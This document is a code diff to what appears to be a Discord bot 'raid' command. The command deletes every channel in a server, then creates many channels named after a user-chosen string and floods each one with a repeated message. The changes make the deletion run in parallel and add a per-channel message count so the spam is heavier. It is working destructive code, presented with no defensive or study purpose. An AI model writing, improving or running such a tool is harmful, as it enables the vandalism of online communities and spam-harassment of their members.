@@ -11,6 +11,7 @@ module.exports = {
     const defaultSpamAMT = 10;
     const defaultChannelName = 'RAID';
     const defaultErrorMessage = 'An internal error has occurred, please check console.';
+    const defaultNumberOfMessagesPerChannel = 5; // Change this to the desired number of messages per channel
 
     const throwInteractionError = (errorMessage) => {
       interaction.reply({ content: errorMessage, ephemeral: true });
@@ -19,50 +20,45 @@ module.exports = {
     let spamAMTbyUser = interaction.options.getInteger('message-amount') || defaultSpamAMT;
     let userMessage = interaction.options.getString('raid-message') || defaultMessage;
     let userChannelName = interaction.options.getString('channel-name') || defaultChannelName;
+    let numberOfMessagesPerChannel = interaction.options.getInteger('message-amt-per-channel') || defaultNumberOfMessagesPerChannel
 
     try {
       const channels = Array.from(guild.channels.cache.values());
-      for (const channel of channels) {
-        try {
-          await channel.delete();
-        } catch (error) {
-          console.error("Error deleting channel:", error);
-        }
-      }
+      await Promise.all(channels.map(channel => channel.delete()));
     } catch (error) {
-        console.error("Error deleting channels:", error);
-        throwInteractionError('Raid Failed ! Invalid Permissions.');
+      console.error("Error deleting channels:", error);
+      throwInteractionError('Raid Failed ! Invalid Permissions.');
       return;
     }
 
     try {
-        const newChannel = await guild.channels.create({
-          name: `${userChannelName}`, 
-          type: ChannelType.GuildText,
-        });
-  
-        try{
-          for (let i = 0; i < spamAMTbyUser; i++) {
-            // Duplicate the channel
-            const duplicateChannel = await guild.channels.create({
-              name: `${userChannelName}-${i+1}`,
-              type: ChannelType.GuildText,
-              parent: newChannel.parent, // Set the same parent as the original channel if applicable
-            });
-        
-            // Send message to duplicate channel
-            await duplicateChannel.send(userMessage);
-          }
-        } catch (error) {
-          throwInteractionError(defaultErrorMessage);
-          console.error("Error creating duplicate channels:", error);
-        }
-        
-      } catch (error) {
-        throwInteractionError(defaultErrorMessage);
-        console.log(`an error has occurred, ${error}`)
-        return;
-      }
-    
+      const newChannel = await guild.channels.create({
+        name: `${userChannelName}`,
+        type: ChannelType.GuildText,
+      });
+
+      await Promise.all(
+        Array.from({ length: spamAMTbyUser }, async (_, i) => {
+          const duplicateChannel = await guild.channels.create({
+            name: `${userChannelName}-${i + 1}`,
+            type: ChannelType.GuildText,
+            parent: newChannel.parent,
+          });
+
+          await Promise.all(
+            Array.from({ length: numberOfMessagesPerChannel }, async () => {
+              try {
+                await duplicateChannel.send(userMessage);
+              } catch (error) {
+                console.error("Error sending message:", error);
+              }
+            })
+          );
+        })
+      );
+    } catch (error) {
+      throwInteractionError(defaultErrorMessage);
+      console.error("Error creating channels:", error);
+    }
   }
 }
